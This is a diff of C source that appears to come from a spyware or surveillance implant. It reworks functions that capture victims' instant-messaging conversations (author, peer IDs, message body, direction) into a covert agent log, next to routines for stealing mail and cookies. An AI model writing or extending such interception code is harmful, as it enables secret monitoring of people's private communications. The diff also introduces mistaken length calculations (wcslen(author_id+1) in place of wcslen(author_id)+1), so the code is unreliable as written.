@@ -129,41 +129,46 @@ void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is
 	return;
 }
 
-void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp) 
+void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming) 
 {
-	WCHAR *program_w;
-	WCHAR *topic_w;
 	WCHAR *peers_w;
 	WCHAR *author_w;
+	WCHAR *peers_id_w;
+	WCHAR *author_id_w;
 	WCHAR *body_w;
 
-	program_w = UTF8_2_UTF16(program);
-	topic_w = UTF8_2_UTF16(topic);
 	peers_w = UTF8_2_UTF16(peers);
 	author_w = UTF8_2_UTF16(author);
+	peers_id_w = UTF8_2_UTF16(peers_id);
+	author_id_w = UTF8_2_UTF16(author_id);
 	body_w = UTF8_2_UTF16(body);
 
-	LogSocialIMMessageW(program_w, topic_w, peers_w, author_w, body_w, tstamp); 
+	LogSocialIMMessageW(program, peers_w, peers_id_w, author_w, author_id_w, body_w, tstamp, is_incoming); 
 
-	SAFE_FREE(program_w);
-	SAFE_FREE(topic_w);
 	SAFE_FREE(peers_w);
 	SAFE_FREE(author_w);
+	SAFE_FREE(peers_id_w);
+	SAFE_FREE(author_id_w);
 	SAFE_FREE(body_w);
 }
 
-void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp) 
+void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming) 
 {
 	bin_buf tolog;
 	DWORD delimiter = ELEM_DELIMITER;
+	DWORD flags = 0;
 
-	if (program && topic && peers && body && author) {
+	if (is_incoming)
+		flags |= 0x01;
+
+	if (program && peers && body && author && peers_id && author_id) {
 		tolog.add(tstamp, sizeof(struct tm));
-		tolog.add(program, (wcslen(program)+1)*sizeof(WCHAR));
-		tolog.add(topic, (wcslen(topic)+1)*sizeof(WCHAR));
+		tolog.add(&program, sizeof(DWORD));
+		tolog.add(&flags, sizeof(DWORD));
+		tolog.add(author_id, wcslen(author_id+1)*sizeof(WCHAR));
+		tolog.add(author, wcslen(author+1)*sizeof(WCHAR));
+		tolog.add(peers_id, (wcslen(peers_id)+1)*sizeof(WCHAR));
 		tolog.add(peers, (wcslen(peers)+1)*sizeof(WCHAR));
-		tolog.add(author, wcslen(author)*sizeof(WCHAR));
-		tolog.add(L": ", wcslen(L": ")*sizeof(WCHAR));
 		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
 		tolog.add(&delimiter, sizeof(DWORD));
 		LOG_InitAgentLog(PM_IMAGENT_SOCIAL);
@@ -171,6 +176,7 @@ void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *auth
 		LOG_StopAgentLog(PM_IMAGENT_SOCIAL);
 	}
 }
+
 
 void DumpNewCookies()
 {
